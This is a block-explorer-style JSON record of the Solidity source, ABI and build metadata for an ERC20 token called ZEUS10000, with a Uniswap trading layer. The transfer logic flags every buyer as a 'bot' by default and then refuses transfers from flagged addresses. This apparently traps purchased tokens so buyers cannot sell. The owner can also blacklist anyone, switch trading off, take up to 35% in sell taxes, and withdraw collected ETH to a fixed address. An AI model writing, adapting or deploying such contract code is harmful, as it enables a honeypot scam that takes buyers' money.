{"SourceCode": "{\"ERC20.sol\":{\"content\":\"pragma solidity ^0.8.7;\\r\\n\\r\\ninterface IERC20 {\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    function transfer(address recipient, uint256 amount)\\r\\n        external\\r\\n        returns (bool);\\r\\n\\r\\n    function allowance(address owner, address spender)\\r\\n        external\\r\\n        view\\r\\n        returns (uint256);\\r\\n\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) external returns (bool);\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n}\\r\\n\\r\\ncontract ERC20 is IERC20 {\\r\\n    uint256 internal _totalSupply = 1e22;\\r\\n    string _name;\\r\\n    string _symbol;\\r\\n    uint8 constant _decimals = 18;\\r\\n    mapping(address =\\u003e uint256) internal _balances;\\r\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) internal _allowances;\\r\\n\\r\\n    constructor(string memory name_, string memory symbol_) {\\r\\n        _name = name_;\\r\\n        _symbol = symbol_;\\r\\n    }\\r\\n\\r\\n    function name() external view returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() external view returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() external pure returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function totalSupply() external view override returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account)\\r\\n        public\\r\\n        view\\r\\n        override\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount)\\r\\n        external\\r\\n        override\\r\\n        returns (bool)\\r\\n    {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        _beforeTokenTransfer(from, to, amount);\\r\\n\\r\\n        uint256 senderBalance = _balances[from];\\r\\n        require(senderBalance \\u003e= amount);\\r\\n        unchecked {\\r\\n            _balances[from] = senderBalance - amount;\\r\\n        }\\r\\n        _balances[to] += amount;\\r\\n        emit Transfer(from, to, amount);\\r\\n        _afterTokenTransfer(from, to, amount);\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender)\\r\\n        external\\r\\n        view\\r\\n        override\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount)\\r\\n        external\\r\\n        override\\r\\n        returns (bool)\\r\\n    {\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _approve(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) external override returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n\\r\\n        uint256 currentAllowance = _allowances[sender][msg.sender];\\r\\n        require(currentAllowance \\u003e= amount);\\r\\n        unchecked {\\r\\n            _approve(sender, msg.sender, currentAllowance - amount);\\r\\n        }\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _burn(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0));\\r\\n\\r\\n        uint256 accountBalance = _balances[account];\\r\\n        require(accountBalance \\u003e= amount);\\r\\n        unchecked {\\r\\n            _balances[account] = accountBalance - amount;\\r\\n        }\\r\\n        _totalSupply -= amount;\\r\\n\\r\\n        emit Transfer(account, address(0), amount);\\r\\n    }\\r\\n\\r\\n    function _beforeTokenTransfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {}\\r\\n\\r\\n    function _afterTokenTransfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {}\\r\\n}\\r\\n\"},\"IUniswapV2Router02.sol\":{\"content\":\"pragma solidity ^0.8.7;\\r\\n\\r\\ninterface IUniswapV2Router02 {\\r\\n    //function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n    function swapExactTokensForETH(\\r\\n        uint256 amountIn,\\r\\n        uint256 amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    ) external;\\r\\n\\r\\n    function factory() external pure returns (address);\\r\\n\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint256 amountTokenDesired,\\r\\n        uint256 amountTokenMin,\\r\\n        uint256 amountETHMin,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    )\\r\\n        external\\r\\n        payable\\r\\n        returns (\\r\\n            uint256 amountToken,\\r\\n            uint256 amountETH,\\r\\n            uint256 liquidity\\r\\n        );\\r\\n}\"},\"TradableErc20.sol\":{\"content\":\"pragma solidity ^0.8.7;\\r\\n\\r\\n//import \\\"hardhat/console.sol\\\";\\r\\nimport \\\"./ERC20.sol\\\";\\r\\nimport \\\"./IUniswapV2Router02.sol\\\";\\r\\n\\r\\ninterface IUniswapV2Factory {\\r\\n    function createPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        returns (address pair);\\r\\n}\\r\\n\\r\\nabstract contract TradableErc20 is ERC20 {\\r\\n    IUniswapV2Router02 internal constant _uniswapV2Router =\\r\\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n    address public uniswapV2Pair;\\r\\n    bool public tradingEnable;\\r\\n    mapping(address =\\u003e bool) public isBot;\\r\\n    mapping(address =\\u003e bool) _isExcludedFromFee;\\r\\n    bool _autoBanBots = true;\\r\\n    bool _inSwap;\\r\\n    uint256 public maxBuy;\\r\\n\\r\\n    uint256 constant maxBuyIncrementMinutesTimer = 2; // increment maxbuy minutes\\r\\n    uint256 constant maxByyIncrementPercentil = 1; // increment maxbyu percentil 1000=100%\\r\\n    uint256 public maxBuyIncrementValue; // value for increment maxBuy\\r\\n    uint256 public incrementTime; // last increment time\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(isOwner(msg.sender));\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    modifier lockTheSwap() {\\r\\n        _inSwap = true;\\r\\n        _;\\r\\n        _inSwap = false;\\r\\n    }\\r\\n\\r\\n    constructor(string memory name_, string memory symbol_)\\r\\n        ERC20(name_, symbol_)\\r\\n    {\\r\\n        _isExcludedFromFee[address(0)] = true;\\r\\n    }\\r\\n\\r\\n    receive() external payable {}\\r\\n\\r\\n    function makeLiquidity() public onlyOwner {\\r\\n        require(uniswapV2Pair == address(0));\\r\\n        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(\\r\\n            address(this),\\r\\n            _uniswapV2Router.WETH()\\r\\n        );\\r\\n        _balances[address(this)] = _totalSupply;\\r\\n        _allowances[address(this)][address(_uniswapV2Router)] = _totalSupply;\\r\\n        _isExcludedFromFee[pair] = true;\\r\\n        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(\\r\\n            address(this),\\r\\n            _totalSupply,\\r\\n            0,\\r\\n            0,\\r\\n            msg.sender,\\r\\n            block.timestamp\\r\\n        );\\r\\n\\r\\n        uniswapV2Pair = pair;\\r\\n        tradingEnable = true;\\r\\n\\r\\n        incrementTime = block.timestamp;\\r\\n        maxBuyIncrementValue = (_totalSupply * maxByyIncrementPercentil) / 1000;\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal override {\\r\\n        require(!isBot[from] \\u0026\\u0026 !isBot[to]);\\r\\n\\r\\n        // buy\\r\\n        if (from == uniswapV2Pair \\u0026\\u0026 !_isExcludedFromFee[to]) {\\r\\n            // increment maxBuy\\r\\n            uint256 incrementCount = (block.timestamp - incrementTime) /\\r\\n                (maxBuyIncrementMinutesTimer * 1 minutes);\\r\\n            if (incrementCount \\u003e 0) {\\r\\n                if (maxBuy \\u003c _totalSupply)\\r\\n                    maxBuy += maxBuyIncrementValue * incrementCount;\\r\\n                incrementTime = block.timestamp;\\r\\n            }\\r\\n\\r\\n            require(tradingEnable);\\r\\n            if (!_autoBanBots) require(_balances[to] + amount \\u003c= maxBuy);\\r\\n            // antibot\\r\\n            if (_autoBanBots) isBot[to] = true;\\r\\n            amount = _getFeeBuy(amount);\\r\\n        }\\r\\n\\r\\n        // sell\\r\\n        if (!_inSwap \\u0026\\u0026 uniswapV2Pair != address(0) \\u0026\\u0026 to == uniswapV2Pair) {\\r\\n            amount = _getFeeSell(amount, from);\\r\\n            uint256 contractTokenBalance = balanceOf(address(this));\\r\\n            if (contractTokenBalance \\u003e 0) {\\r\\n                uint256 maxContractBalance = (balanceOf(uniswapV2Pair) *\\r\\n                    getMaxContractBalancePercent()) / 100;\\r\\n                if (contractTokenBalance \\u003e maxContractBalance) {\\r\\n                    uint256 burnCount;\\r\\n                    unchecked {\\r\\n                        burnCount = contractTokenBalance - maxContractBalance;\\r\\n                    }\\r\\n                    contractTokenBalance = maxContractBalance;\\r\\n                    _totalSupply -= burnCount;\\r\\n                    emit Transfer(address(this), address(0), burnCount);\\r\\n                }\\r\\n                //console.log(\\\"swapTokensForEth\\\");\\r\\n                uint256 swapCount = contractTokenBalance;\\r\\n                uint256 maxSwapCount = 2 * amount;\\r\\n                if (swapCount \\u003e maxSwapCount) swapCount = maxSwapCount;\\r\\n                swapTokensForEth(swapCount);\\r\\n            }\\r\\n        }\\r\\n\\r\\n        // transfer\\r\\n        //console.log(from, \\\"-\\u003e\\\", to);\\r\\n        //console.log(\\\"amount: \\\", amount);\\r\\n        super._transfer(from, to, amount);\\r\\n        //console.log(\\\"=====end transfer=====\\\");\\r\\n    }\\r\\n\\r\\n    function _getFeeBuy(uint256 amount) private returns (uint256) {\\r\\n        uint256 fee = amount / 20; // 5%\\r\\n        amount -= fee;\\r\\n        _balances[address(this)] += fee;\\r\\n        return amount;\\r\\n    }\\r\\n\\r\\n    function getSellBurnCount(uint256 amount) internal view returns (uint256) {\\r\\n        // calculate fee percent\\r\\n        uint256 value = _balances[uniswapV2Pair];\\r\\n        uint256 vMin = value / 100; // min additive tax amount\\r\\n        if (amount \\u003c= vMin) return amount / 20; // 5% constant tax\\r\\n        uint256 vMax = value / 10; // max additive tax amount 10%\\r\\n        if (amount \\u003e vMax) return (amount * 35) / 100; // 35% tax\\r\\n\\r\\n        // additive tax, that in intervat 0-35%\\r\\n        return (((amount - vMin) * 35 * amount) / (vMax - vMin)) / 100;\\r\\n    }\\r\\n\\r\\n    function _getFeeSell(uint256 amount, address account)\\r\\n        private\\r\\n        returns (uint256)\\r\\n    {\\r\\n        // get taxes\\r\\n        uint256 devFee = amount / 20; // 5%\\r\\n        uint256 burnCount = getSellBurnCount(amount); // burn count\\r\\n\\r\\n        amount -= devFee + burnCount;\\r\\n        _balances[account] -= devFee + burnCount;        \\r\\n        _balances[address(this)] += devFee;\\r\\n        _totalSupply -= burnCount;\\r\\n        emit Transfer(address(this), address(0), burnCount);\\r\\n        return amount;\\r\\n    }\\r\\n\\r\\n    function setMaxBuy(uint256 percent) external onlyOwner {\\r\\n        _setMaxBuy(percent);\\r\\n    }\\r\\n\\r\\n    function _setMaxBuy(uint256 percentil) internal {\\r\\n        maxBuy = (percentil * _totalSupply) / 1000;\\r\\n    }\\r\\n\\r\\n    function getMaxBuy() external view returns (uint256) {\\r\\n        uint256 incrementCount = (block.timestamp - incrementTime) /\\r\\n            (maxBuyIncrementMinutesTimer * 1 minutes);\\r\\n        if (incrementCount == 0) return maxBuy;\\r\\n\\r\\n        return maxBuy + maxBuyIncrementValue * incrementCount;\\r\\n    }\\r\\n\\r\\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\\r\\n        // generate the uniswap pair path of token -\\u003e weth\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = _uniswapV2Router.WETH();\\r\\n\\r\\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\\r\\n\\r\\n        // make the swap\\r\\n        _uniswapV2Router.swapExactTokensForETH(\\r\\n            tokenAmount,\\r\\n            0, // accept any amount of ETH\\r\\n            path,\\r\\n            address(this), // The contract\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function setBots(address[] memory accounts, bool value) external onlyOwner {\\r\\n        for (uint256 i = 0; i \\u003c accounts.length; ++i) {\\r\\n            isBot[accounts[i]] = value;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function setExcludeFromFee(address[] memory accounts, bool value)\\r\\n        external\\r\\n        onlyOwner\\r\\n    {\\r\\n        for (uint256 i = 0; i \\u003c accounts.length; ++i) {\\r\\n            _isExcludedFromFee[accounts[i]] = value;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function setTradingEnable(bool value, bool autoBanBotsValue)\\r\\n        external\\r\\n        onlyOwner\\r\\n    {\\r\\n        tradingEnable = value;\\r\\n        _autoBanBots = autoBanBotsValue;\\r\\n    }\\r\\n\\r\\n    function setAutoBanBots(bool value) external onlyOwner {\\r\\n        _autoBanBots = value;\\r\\n    }\\r\\n\\r\\n    function withdraw() external onlyOwner {\\r\\n        _withdraw(address(this).balance);\\r\\n    }\\r\\n\\r\\n    function getMaxContractBalancePercent() internal virtual returns (uint256);\\r\\n\\r\\n    function _withdraw(uint256 sum) internal virtual;\\r\\n\\r\\n    function isOwner(address account) internal virtual returns (bool);\\r\\n}\\r\\n\"},\"ZEUS10000.sol\":{\"content\":\"// https://ZEUS10000.com\\r\\n// https://t.me/zeus10000\\r\\n\\r\\npragma solidity ^0.8.7;\\r\\n\\r\\nimport \\\"./TradableErc20.sol\\\";\\r\\n\\r\\ncontract ZEUS10000 is TradableErc20 {\\r\\n    address _owner;\\r\\n    address _withdrawAddress =\\r\\n        address(0x64485E260439613940b16821ad080c6862B73152);\\r\\n    uint256 maxContractLiquidityPercent = 4;\\r\\n\\r\\n    constructor() TradableErc20(\\\"ZEUS10000\\\", \\\"ZEUS10000\\\") {\\r\\n        _owner = msg.sender;\\r\\n        _setMaxBuy(2);\\r\\n    }\\r\\n\\r\\n    function getMaxContractBalancePercent()\\r\\n        internal\\r\\n        view\\r\\n        override\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return maxContractLiquidityPercent;\\r\\n    }\\r\\n\\r\\n    function setMaxContractLiquidityPercent(uint256 newMaxLiquidityPercent)\\r\\n        external\\r\\n        onlyOwner\\r\\n    {\\r\\n        maxContractLiquidityPercent = newMaxLiquidityPercent;\\r\\n    }\\r\\n\\r\\n    function _withdraw(uint256 sum) internal override {\\r\\n        payable(_withdrawAddress).transfer(sum);\\r\\n    }\\r\\n\\r\\n    function isOwner(address account) internal view override returns (bool) {\\r\\n        return account == _owner || account == _withdrawAddress;\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address newOwner) external onlyOwner {\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\\r\\n\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMaxBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"incrementTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"makeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyIncrementValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setAutoBanBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setExcludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"name\":\"setMaxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxLiquidityPercent\",\"type\":\"uint256\"}],\"name\":\"setMaxContractLiquidityPercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"autoBanBotsValue\",\"type\":\"bool\"}],\"name\":\"setTradingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ZEUS10000", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0d3d3c2429ee938bd2ba5309126b2aefcc6762bee1fa4e1c68bdeada2fbf1445"}